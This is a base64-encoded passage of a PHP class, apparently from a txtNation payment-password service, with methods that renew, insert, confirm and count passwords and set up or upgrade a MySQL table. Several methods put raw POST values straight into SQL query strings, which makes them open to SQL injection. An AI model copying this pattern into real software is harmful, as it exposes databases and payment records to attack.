QkJCQlMSU1JVCAxIjsKCQkKCQlpZigkdGhpcy0+UXVlcnkoJHN0clNRTCkgJiYgJHRoaXMtPk51bVJvd3MoKSl7CgkJCQoJCQkkYXJyUGFzc3dvcmREYXRhID0gJHRoaXMtPkdldEFycmF5KCk7CgkJCQoJCQlpZigkYXJyUGFzc3dvcmREYXRhWydzdGF0dXMnXSA9PSAnMCcpewoJCQkKCQkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnVU5VU0VEJyBmb3IgYSB1bnVzZWQgcGFzc3dvcmQgKi8KCQkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJVTlVTRUQiKTsKCQkJfWVsc2V7CgkJCQkKCQkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnVVNFRCcgZm9yIGEgdXNlZCBwYXNzd29yZCAqLwoJCQkJJHRoaXMtPlNjcmlwdFN1Y2Nlc3MoIlVTRUQiKTsKCQkJfQoJCQkKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDA4JyAqLwoJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAwOCIpOwoJCX0KCQkKCX0KCQoJLyoqCgkgKiBAYnJpZWYgUmVuZXcgYSBwYXNzd29yZCBzbyB0byBhbGxvdyB0aGUgdXNlciB0byB0cnkgYWdhaW4gaW4gdGhlIGNhc2Ugb2YgYW4gZXJyb3IKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqLwoJZnVuY3Rpb24gUmVuZXdQYXNzd29yZCgpewoJCQoJCS8qKiBAbm90ZSBCdWlsZCB0aGUgcXVlcnkgdG8gcmVhY3RpdmF0ZSBhIHBhc3N3b3JkIGluIHRoZSBwYXNzd29yZCBkYXRhYmFzZSAqLwoJCSRzdHJTUUwgPSAiVVBEQVRFIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJCSAgU0VUIGBzdGF0dXNgID0gJzAnCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydwYXNzd2QnXX0nCgkJCQkJTElNSVQgMSI7CgkJCgkJaWYoJHRoaXMtPlF1ZXJ5KCRzdHJTUUwpICYmICR0aGlzLT5BZmZSb3dzKCkpewoJCQkKCQkJLy9JZiB0aGUgY3VzdG9tIHZhcmlhYmxlIGlzIHNldCB0aGVuIGluY2x1ZGUgdGhlIGF1dG8gbm90aWZpY2F0aW9uICdSZW5ldycgc3JpcHQgdG8gY29tcGxldGUgdGhlIHBheW1lbnQKCQkJaWYoaXNfYXJyYXkoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddKSAmJiBhcnJheV9rZXlfZXhpc3RzKCdhdXRvX25vdGlmaWNhdGlvbl9yZW5ld19zY3JpcHQnLCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXSkpewoJCQkJCgkJCQlpZigkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ11bJ2F1dG9fbm90aWZpY2F0aW9uX3JlbmV3X3NjcmlwdCddICE9ICcnKXsKCQkJCQlpbmNsdWRlX29uY2UoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddWydhdXRvX25vdGlmaWNhdGlvbl9yZW5ld19zY3JpcHQnXSk7CgkJCQl9CgkJCX0KCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnUkVORVdFRCcgd2hlbiBwYXNzd29yZCBpcyByZW5ld2VkICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJSRU5FV0VEIik7CgkJfWVsc2V7CgkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAwOScgKi8KCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDkiKTsKCQl9CgkJCgl9CgkKCS8qKgoJICogQGJyaWVmIEluc2VydCB0aGUgbmV3IHBhc3N3b3JkIGludG8gdGhlIGNsaWVudHMgZGF0YWJhc2UgcmVhZHkgZm9yIHVzZQoJICogQHVzZXMgRGF0YWJhc2UKCSAqCgkgKi8KCWZ1bmN0aW9uIFByb2Nlc3NOZXdQYXNzd29yZCgpewoJCQoJCWlmKGVtcHR5KCR0aGlzLT5hcnJQb3N0RGF0YVsndXNlcm5hbWUnXSkpewoJCQkkdGhpcy0+YXJyUG9zdERhdGFbJ3VzZXJuYW1lJ10gPSBudWxsOwoJCX0KCQkKCQkvKiogQG5vdGUgQnVpbGQgdGhlIHF1ZXJ5IHRvIGluc2VydCBhIG5ldyBwYXNzd29yZCBpbnRvIHRoZSBwYXNzd29yZCBkYXRhYmFzZSAqLwoJCSRzdHJTUUwgPSAiSU5TRVJUIElOVE8gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gCgkJCQkJICBTRVQgYHBhc3N3b3JkYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydwYXNzd2QnXX0nLAoJCQkJCSAgCSAgYHVzZXJuYW1lYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWyd1c2VybmFtZSddfScsCgkJCQkJICAJICBgc3RhdHVzYCA9ICcwJywKCQkJCQkgIAkgIGBudW1iZXJgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ251bWJlciddfScsCgkJCQkJICAJICBgcmNgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ3JjJ119JywKCQkJCQkgIAkgIGByZWZlcmVyYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydyZWZlcmVyaWQnXX0nLAoJCQkJCSAgCSAgYHRyYW5zSURgID0gJ3skdGhpcy0+YXJyUG9zdERhdGFbJ3RyYW5zYWN0aW9uSUQnXX0nLAoJCQkJCSAgCSAgYGN1cnJlbmN5YCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydjdXJyZW5jeSddfScsCgkJCQkJICAJICBgdHJhbnNUeXBlYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWyd0cmFuc2FjdGlvblR5cGUnXX0nLAoJCQkJCSAgCSAgYGFtb3VudGAgPSAneyR0aGlzLT5hcnJQb3N0RGF0YVsnYW1vdW50J119JywKCQkJCQkgIAkgIGBkYXRlYCA9IE5PVygpIjsKCQkKCQlpZigkdGhpcy0+UXVlcnkoJHN0clNRTCkgJiYgJHRoaXMtPkluc0lkKCkpewoJCQkKCQkJLy9JZiB0aGUgY3VzdG9tIHZhcmlhYmxlIGlzIHNldCB0aGVuIGluY2x1ZGUgdGhlIGF1dG8gbm90aWZpY2F0aW9uIHNyaXB0IHRoYXQgY2FuIGJlIHVzZWQgdG8gbm90aWZ5IG9mIGluaXRhbGlzZWQgcGF5bWVudAoJCQlpZihpc19hcnJheSgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ10pICYmIGFycmF5X2tleV9leGlzdHMoJ2F1dG9fbm90aWZpY2F0aW9uX3NjcmlwdCcsJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddKSl7CgkJCQkKCQkJCWlmKCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXVsnYXV0b19ub3RpZmljYXRpb25fc2NyaXB0J10gIT0gJycpewoJCQkJCWluY2x1ZGVfb25jZSgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ11bJ2F1dG9fbm90aWZpY2F0aW9uX3NjcmlwdCddKTsKCQkJCX0KCQkJfQoJCQkKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdBRERFRCcgdG8gYWNrbm93bGVkZ2UgdGhlIG5ldyBwYXNzd29yZHMgYWRkaXRpb24gdG8gdGhlIGRhdGFiYXNlICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJBRERFRCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMTAnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDEwIik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBDb25maXJtIHRoYXQgdGhlIHVzZXIgaGFzIHJlY2l2ZWQgYW5kIGVudGVyZWQgdGhlIHBhc3N3b3JkCgkgKiBAdXNlcyBEYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gQ29uZmlybVBhc3N3b3JkKCl7CgkJCgkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byB1cGRhdGUgdGhlIHBhc3N3b3JkIHRvIGJlIGNvbmZpcm1lZCAqLwoJCSRzdHJTUUwgPSAiVVBEQVRFIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJCSAgU0VUIGBjb25maXJtZWRgID0gJzEnCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHRoaXMtPmFyclBvc3REYXRhWydwYXNzd2QnXX0nCgkJCQkJTElNSVQgMSI7CgkJCgkJaWYoJHRoaXMtPlF1ZXJ5KCRzdHJTUUwpICYmICR0aGlzLT5BZmZSb3dzKCkpewoJCQkKCQkJLy9TZWUgaWYgdGhlIHBhc3N3b3JkIGlzIHJlcXVpcmVkIHRvIGJlIHNldCBhcyB1c2VkIHVwb24gY29uZmlybWF0aW9uCgkJCWlmKGlzX2FycmF5KCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXSkgJiYgYXJyYXlfa2V5X2V4aXN0cygndXNlX3Bhc3N3b3JkX29uX2NvbmZpcm1hdGlvbicsJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddKSl7CgkJCQkKCQkJCWlmKCR0aGlzLT5hcnJDb25maWdEYXRhWydjdXN0b20nXVsndXNlX3Bhc3N3b3JkX29uX2NvbmZpcm1hdGlvbiddID09IHRydWUpewoJCQkJCQoJCQkJCS8vU2V0IHRoZSBwYXNzd29yZCB0byBiZSB1c2VkIGlmIHJlcXVpcmVkIGJ5IHRoZSBjb25maWcgZmlsZQoJCQkJCSR0aGlzLT5Vc2VQYXN3b3JkKCR0aGlzLT5hcnJQb3N0RGF0YVsncGFzc3dkJ10sMSxudWxsLG51bGwsdHJ1ZSk7CgkJCQl9CgkJCX0KCQkJCgkJCS8vSWYgdGhlIGN1c3RvbSB2YXJpYWJsZSBpcyBzZXQgdGhlbiBpbmNsdWRlIHRoZSBjb21wbGV0ZV9wYXltZW50X3NjcmlwdCB0byBjb21wbGV0ZSB0aGUgcGF5bWVudAoJCQlpZihpc19hcnJheSgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ10pICYmIGFycmF5X2tleV9leGlzdHMoJ2NvbXBsZXRlX3BheW1lbnRfc2NyaXB0JywkdGhpcy0+YXJyQ29uZmlnRGF0YVsnY3VzdG9tJ10pKXsKCQkJCQoJCQkJaWYoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddWydjb21wbGV0ZV9wYXltZW50X3NjcmlwdCddICE9ICcnKXsKCQkJCQlpbmNsdWRlX29uY2UoJHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2N1c3RvbSddWydjb21wbGV0ZV9wYXltZW50X3NjcmlwdCddKTsKCQkJCX0KCQkJfQoJCQkKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdBRERFRCcgdG8gYWNrbm93bGVkZ2UgdGhlIG5ldyBwYXNzd29yZHMgYWRkaXRpb24gdG8gdGhlIGRhdGFiYXNlICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJBRERFRCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMTAnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDEwIik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBTZXR1cCB0aGUgY2xpZW50cyBkYXRhYmFzZSBhbmQgSVAgYWRkcmVzcyBsaXN0CgkgKiBAdXNlcyBEYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gU2V0dXBDbGllbnQoKXsKCQkKCQlpZighJHRoaXMtPlRhYmxlRXhpc3RzKCkpewoJCQkKCQkJLyoqIEBub3RlIENyZWF0ZSBhIG5ldyBkYXRhYmFzZSB0YWJsZSBvbiB0aGUgY2xpZW50cyBzZXJ2ZXIgKi8KCQkJJHN0clNRTCA9ICJDUkVBVEUgVEFCTEUgYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gICgKCQkJCQkJCQkJYGlkYCBJTlQoIDExICkgVU5TSUdORUQgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCgkJCQkJCQkJCWBwYXNzd29yZGAgQ0hBUiggMjAgKSBOT1QgTlVMTCBDT01NRU5UICdUaGUgcGFzc3dvcmQnLAoJCQkJCQkJCQlgdXNlcm5hbWVgIENIQVIoIDIwICkgTlVMTCBDT01NRU5UICdUaGUgdXNlcm5hbWUgaWYgcmVxdWlyZWQgYnkgc2VydmljZScsCgkJCQkJCQkJCWBzdGF0dXNgIElOVCggMTEgKSBVTlNJR05FRCBOT1QgTlVMTCBERUZBVUxUICcwJyBDT01NRU5UICdQYXNzd29yZCAnJzAnJyAtIHVudXNlZCwgaW5jcmFtZW50YWwgZm9yIG9uZSB1c2Ugb3IgaGlnaGVyJywKCQkJCQkJCQkJYG51bWJlcmAgQ0hBUiggMTMgKSBOT1QgTlVMTCAsCgkJCQkJCQkJCWByY2AgQ0hBUiggODAgKSBOT1QgTlVMTCAsCgkJCQkJCQkJCWByZWZlcmVyYCBDSEFSKCA4MCApIE5PVCBOVUxMIENPTU1FTlQgJ1VuaXF1ZSByZWZlcmVyIGNhbiBiZSB1c2VkIHRvIGlkZW50aWZ5IHRoZSBjbGllbnQnLAoJCQkJCQkJCQlgdHJhbnNJRGAgSU5UIE5PVCBOVUxMIENPTU1FTlQgJ1RyYW5zYWN0aW9uIElEIGNhbiBiZSB1c2VkIHRvIGlkZW50aWZ5IHRoaXMgcGF5bWVudCcsCgkJCQkJCQkJCWBjdXJyZW5jeWAgQ0hBUiggMyApIE5PVCBOVUxMIENPTU1FTlQgJ0N1cnJlbmN5IG9mIHRoZSB0cmFuc2FjdGlvbicsCgkJCQkJCQkJCWB0cmFuc1R5cGVgIENIQVIoIDMwICkgTk9UIE5VTEwgLAoJCQkJCQkJCQlgYW1vdW50YCBGTE9BVCBOT1QgTlVMTCBDT01NRU5UICdBbW91bnQgb2YgdGhlIHRyYW5zYWN0aW9uJywKCQkJCQkJCQkJYGNvbmZpcm1lZGAgSU5UKCAxMSApIFVOU0lHTkVEIE5PVCBOVUxMIERFRkFVTFQgJzAnIENPTU1FTlQgJ0lmIHRoZSB1c2VyIGVudGVycyB0aGUgcGFzd29yZCBvbiB0aGUgbWVuYWJsZSB3aW5kb3cgYSBjb25maXJtYXRpb24gcG9zdCB3aWxsIGJlIHNlbnQgdG91cGRhdGUgdGhpcyBmZWlsZCcsCgkJCQkJCQkJCWBkYXRlYCBDSEFSKCAxOSApIE5PVCBOVUxMIENPTU1FTlQgJ0RhdGUgdGhlIHRyYW5zYWN0aW9uIHRvb2sgcGxhY2UnLAoJCQkJCQkJIFVOSVFVRSAoYHBhc3N3b3JkYCkKCQkJCQkJCQkJKSBFTkdJTkUgPSBNWUlTQU0gQ09NTUVOVCA9ICd0eHROYXRpb24gcGFzc3dvcmQgVGFibGUnOyI7CgkJCQoJCQkvKiogQG5vdGUgQ3JlYXRlIG5ldyBkYXRhYmFzZSwgcXVlcnkgZnVuY3Rpb24gd2lsbCBzZW5kIGVycm9yIGNvZGUgTVAtMDExIG9uIGV4Y2VwdGlvbiAqLwoJCQkkdGhpcy0+UXVlcnkoJHN0clNRTCk7CgkJCQoJCQlpZigkdGhpcy0+VGFibGVFeGlzdHMoKSl7CgkJCQkKCQkJCSR0aGlzLT5Qb3N0VmFyVGVzdCgpOwoJCQkJCgkJCQkvKiogQG5vdGUgUmV0dXJuIHN1Y2Nlc3MgcmVzcG9uc2UgJ0FDVElWRScgdG8gYWNrbm93bGVkZ2UgdGhlIHN5c3RlbSBpcyBhY3RpdmVseSByZXNwb25kaW5nIHRvIHJlcXVlc3RzICovCgkJCQkkdGhpcy0+U2NyaXB0U3VjY2VzcygiQUNUSVZFIik7CgkJCX1lbHNlewoJCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDAyJyAqLwoJCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDIiKTsKCQkJfQoJCQkKCQl9ZWxzZXsKCQkJCgkJCS8qKiBAbm90ZSBVcGdyYWRlIHRoZSB0YWJsZSB3aGVuIHJlcXVpcmVkIGZvciBzZXJ2aWNlIHVwZGF0ZXMgKiovCgkJCSR0aGlzLT5VcGdyYWRlVGFibGUoKTsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3VjY2VzcyByZXNwb25zZSAnQUNUSVZFJyB0byBhY2tub3dsZWRnZSB0aGUgc3lzdGVtIGlzIGFjdGl2bHkgcmVzcG9uZGluZyB0byByZXF1ZXN0cyAqLwoJCQkkdGhpcy0+U2NyaXB0U3VjY2VzcygiQUNUSVZFIik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIEBicmllZiBDaGVja3MgdG8gc2VlIGlmIHRoZSByZXF1aXJlZCBmaWVsZHMgYXJlIGluIHRoZSB0YWJsZSBhbmQgdXBncmFkZXMgb2xkIGluc3RhbGxhdGlvbnMgd29yayB3aXRoIG5ldyBzY3JpcHRzCgkgKiBAdmVyc2lvbiAxLjEuMAoJICogCgkgKiBWZXJzaW9uIEhpc3Rvcnk6CgkgKiAxLjEuMAktCUFkZHMgdGhlIGZlaWxkICdjb25maXJtZWQnLCBmZWlsZCB3YXMgYWRkZWQgaW4gUkEgMS4xLjAKCSAqLwoJZnVuY3Rpb24gVXBncmFkZVRhYmxlKCl7CgkJCgkJLyoqIEBub3RlIENoZWNrIHRvIHNlZSBpZiB0aGUgZmVpbGQgY29uZmlybWVkIGV4aXN0cywgSWYgbm90IHRoZW4gYWx0ZXIgdGhlIHRhYmxlIGFuZCBhZGQgdGhlIG5ldyBmZWlsZCAqKi8KCQkkc3RyU1FMID0gIlNIT1cgRklFTERTCgkJCQkgICBGUk9NIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YAoJCQkJICBXSEVSRSBgRmllbGRgID0gJ2NvbmZpcm1lZCciOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAhJHRoaXMtPk51bVJvd3MoKSl7CgoJCQkvKiogQG5vdGUgRm9yIGV4aXN0aW5nIGNsaWVudHMgd2FudGluZyB0byB1cGRhdGUsIGFsdGVyIHRoZSB0YWJsZSB0byBhZGQgdGhlIG5lc3Nhc2VyeSBmZWlsZCAqKi8KCQkJJHN0clNRTCA9ICJBTFRFUiBUQUJMRSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQkJIEFERCBgY29uZmlybWVkYCBJTlQoIDExICkgVU5TSUdORUQgTk9UIE5VTEwgREVGQVVMVCAnMCcgQ09NTUVOVCAnSWYgdGhlIHVzZXIgZW50ZXJzIHRoZSBwYXN3b3JkIG9uIHRoZSBtZW5hYmxlIHdpbmRvdyBhIGNvbmZpcm1hdGlvbiBwb3N0IHdpbGwgYmUgc2VudCB0b3VwZGF0ZSB0aGlzIGZlaWxkJwoJCQkJCSAgIEFGVEVSIGBhbW91bnRgOyI7CgkJCQoJCQkvKiogQG5vdGUgQWx0ZXIgdGhlIHRhYmxlIGlmIHJlcXVpcmVkLCBxdWVyeSBmdW5jdGlvbiB3aWxsIHNlbmQgZXJyb3IgY29kZSBNUC0wMTEgb24gZXhjZXB0aW9uICovCgkJCSR0aGlzLT5RdWVyeSgkc3RyU1FMKTsKCQl9Cgl9CgkKCS8qKgoJICogQGJyaWVmIFBlcmZvcm0gYSBzeXN0ZW0gY2hlY2sgb24gdGhlIGNsaWVudHMgc3lzdGVtIHRvIGNoZWNrIHRoYXQgZGF0YWJhc2UgYWNjZXNzIGFuZCB2YWxpZCBhY2NlcHRhbmNlIG9mIHBvc3RzIGFyZSBhbGwgd29ya2luZyBvawoJICoKCSAqLwoJZnVuY3Rpb24gU3lzdGVtQ2hlY2soKXsKCQkKCQkkdGhpcy0+RGF0YWJhc2VPYmplY3QoKTsKCQkKCQlpZigkdGhpcy0+VGFibGVFeGlzdHMoKSl7CgkJCgkJCSR0aGlzLT5Qb3N0VmFyVGVzdCgpOwoJCQoJCQkvKiogQG5vdGUgUmV0dXJuIHN1Y2Nlc3MgcmVzcG9uc2UgJ0FDVElWRScgdG8gYWNrbm93bGVkZ2UgdGhlIHN5c3RlbSBpcyBhY3RpdmVseSByZXNwb25kaW5nIHRvIHJlcXVlc3RzICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJBQ1RJVkUiKTsKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdJTkFDVElWRScgdG8gYWxlcnQgdGhhdCB0aGUgc3lzdGVtIHJlcXVpcmVzIHNldHVwICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJJTkFDVElWRSIsZmFsc2UpOwoJCX0KCQkKCX0KCQoJLyoqCgkgKiBAYnJlaWYgQ2hlY2sgdGhhdCB0aGUgdGFibGUgZXhpc3RzIHdpdGhpbiB0aGUgY2xpZW50cyBzeXN0ZW0KCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqIEByZXR1cm4gYm9vbGVhbiBSZXR1cm5zICd0cnVlJyBpZiB0aGUgdGFibGUgZXhpc3RzCgkgKi8KCWZ1bmN0aW9uIFRhYmxlRXhpc3RzKCl7CgkJCgkJJGJsUGFzc3dvcmRUYWJsZUV4aXN0cyA9IGZhbHNlOwoJCQoJCS8qKiBAbm90ZSBCdWlsZCBhIHF1ZXJ5IHRvIGNoZWNrIHRhYmxlcyBleGlzdGVuY2UgKi8KCQkkc3RyU1FMID0gIlNIT1cgVEFCTEVTIEZST00gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gIExJS0UgJ3skdGhpcy0+c3RyVGFibGVOYW1lfSciOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCgkJCSRibFBhc3N3b3JkVGFibGVFeGlzdHMgPSB0cnVlOwoJCX0KCQkKCQlyZXR1cm4gJGJsUGFzc3dvcmRUYWJsZUV4aXN0czsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgVGVzdCB0aGUgdmFsaWRpdHkgb2YgdGhlIHBvc3RzIHJlY2VpdmVkIGludG8gdGhlIGNsaWVudHMgc2VydmVyIAoJICoKCSAqLwoJZnVuY3Rpb24gUG9zdFZhclRlc3QoKXsKCQkKCQkkc3RyVGVzdERhdGEgPSBzaGExKCR0aGlzLT5hcnJQb3N0RGF0YVsncGFzc3dkJ10uIk1QVlQyMiIpOwoJCQoJCWlmKCR0aGlzLT5hcnJQb3N0RGF0YVsnc2VjdXJldGVzdCddICE9ICRzdHJUZXN0RGF0YSl7CgkJCS8qKiBAbm90ZSBSZXR1cm4gZXJyb3IgcmVzcG9uc2UgJ01QLTAwNicgKi8KCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDYiKTsKCQl9CgoJfQoJCgkvKioKCSAqIEBicmllZiBQcm9jZXNzIGFueSBhZGRpdGlvbmFsIGRhdGEgdG8gYmUgcmV0dXJuZWQgYnkgdGhlIHNjcmlwdCBvbiByZXF1ZXN0CgkgKgoJICogQHJldHVybiBzdHJpbmcgcmV0dXJucyBhbnkgYWRkaXRpb25hbCBpbmZvIGFzIGEgc3RyaW5nCgkgKi8KCWZ1bmN0aW9uIFByb2Nlc3NBZGRpdGlvbmFsRGF0YSgpewoJCQoJCSRzdHJPdXRwdXREYXRhID0gIiI7CgkJCgkJaWYoIWlzX251bGwoJHRoaXMtPmFyckFkaXRpb25hbERhdGEpICYmIGlzX2FycmF5KCR0aGlzLT5hcnJBZGl0aW9uYWxEYXRhKSl7CgkJCQoJCQkvKiogQG5vdGUgTG9vcCB0aHJvdWdoIHRoZSBhZGRpdGlvbmFsIGRhdGEgYXJyYXkgYW5kIGV4cG9ydCBhcyBmb3JtYXR0ZWQgc3RyaW5nICovIAoJCQlmb3JlYWNoKCR0aGlzLT5hcnJBZGl0aW9uYWxEYXRhIGFzICRzdHJLZXkgPT4gJHN0clZhbHVlKXsKCQkJCQoJCQkJJHN0ck91dHB1dERhdGEgLj0gIjx7JHN0cktleX0+eyRzdHJWYWx1ZX08L3skc3RyS2V5fT5cbiI7CgkJCQkKCQkJfQoJCQkKCQl9CgkJCgkJcmV0dXJuICRzdHJPdXRwdXREYXRhOwoJfQoJCgkvKioKCSAqIEBicmllZiBHZW5lcmF0ZSBhbGwgc3lzdGVtIGluZm9ybWF0aW9uIHNvIHRoYXQgd2UgY2FuIGtlZXAgdGhlIGNsaWVudCB1cCB0byBkYXRlIGFuZCByZWNlaXZpbmcgYW4gdW5pbnRlcnJ1cHRlZCBzZXJ2aWNlCgkgKiBAdXNlcyBGaWxlIEFjY2VzcwoJICogCgkgKiBAcGFyYW0gYm9vbGVhbiAkYmxQYXNzd29yZENvdW50CgkgKiBAcmV0dXJuIHN0cmluZyByZXR1cm5zIGEgZnVsbCBzeXN0ZW0gaW5mbyByZXBvcnQgYXMgYSBzdHJpbmcKCSAqLwoJZnVuY3Rpb24gUHJvY2Vzc1N5c3RlbUluZm9ybWF0aW9uKCRibFBhc3N3b3JkQ291bnQgPSBmYWxzZSl7CgkJCgkJJHN0ck91dHB1dERhdGEgPSAiIjsKCQkKCQkkc3RyT3V0cHV0RGF0YSAuPSAiPHN5c3RlbS12ZXJzaW9uPnskdGhpcy0+c3RyVmVyc2lvbn08L3N5c3RlbS12ZXJzaW9uPlxuIjsKCQkKCQkkc3RyQ3JlYXRpb25EYXRlID0gZGF0ZSgnRCBqUyBGIFknLGZpbGVjdGltZShfX0ZJTEVfXykpOwoJCSRzdHJPdXRwdXREYXRhIC49ICI8c3lzdGVtLXNldHVwPnskc3RyQ3JlYXRpb25EYXRlfTwvc3lzdGVtLXNldHVwPlxuIjsKCQkKCQlpZigkYmxQYXNzd29yZENvdW50KXsKCQkJJGludFBhc3N3b3JkQ291bnQgPSAkdGhpcy0+Q291bnRQYXNzd29yZHMoKTsKCQkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0tcGFzc3dvcmRzPnskaW50UGFzc3dvcmRDb3VudH08L3N5c3RlbS1wYXNzd29yZHM+XG4iOwoJCX0KCQkKCQkkc3RyVmFsaWRhdGlvbiA9IHNoYTFfZmlsZShfX0ZJTEVfXyk7CgkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0tdmFsaWQ+eyRzdHJWYWxpZGF0aW9ufTwvc3lzdGVtLXZhbGlkPlxuIjsKCQkKCQlpZigkdGhpcy0+Q2hlY2tTZWN1cml0eSgpKXsKCQkJJHN0cklwVmVyc2lvbiA9ICR0aGlzLT5HZXRJcFZlcnNpb24oKTsKCQkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0taXB2ZXJzaW9uPnskc3RySXBWZXJzaW9ufTwvc3lzdGVtLWlwdmVyc2lvbj5cbiI7CgkJCQoJCQkkc3RySXBWYWxpZGF0aW9uID0gc2hhMV9maWxlKCcuaHRhY2Nlc3MnKTsKCQkJJHN0ck91dHB1dERhdGEgLj0gIjxzeXN0ZW0taXB2YWxpZD57JHN0cklwVmFsaWRhdGlvbn08L3N5c3RlbS1pcHZhbGlkPlxuIjsKCQkJCgkJfQoJCQoJCXJldHVybiAkc3RyT3V0cHV0RGF0YTsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IGEgdG90YWwgY291bnQgb2YgcGFzc3dvcmRzIHdpdGhpbiB0aGUgY2xpZW50cyBzeXN0ZW0gYW5kIHJldHVybiBjb3VudAoJICogQHVzZXMgRGF0YWJhc2UKCSAqIAoJICogQHJldHVybiBpbnRlZ2VyIHJldHVybnMgYSB0b3RhbCBwYXNzd29yZCBjb3VudAoJICovCglmdW5jdGlvbiBDb3VudFBhc3N3b3JkcygpewoJCQoJCSRpbnRQYXNzd29yZENvdW50ID0gMDsKCQkKCQkvKiogQG5vdGUgQnVpbGQgdGhlIHF1ZXJ5IHRvIGdldCB0aGUgc3RhdHVzIG9mIGEgcGFzc3dvcmQgaW4gdGhlIHBhc3N3b3JkIGRhdGFiYXNlICovCgkJJHN0clNRTCA9ICJTRUxFQ1QgY291bnQoKikgQVMgYHRvdGFsUGFzc3dvcmRzYAoJCQkJCSBGUk9NIGB7JHRoaXMtPmFyckNvbmZpZ0RhdGFbJ2RhdGFiYXNlJ119YC5geyR0aGlzLT5zdHJUYWJsZU5hbWV9YCI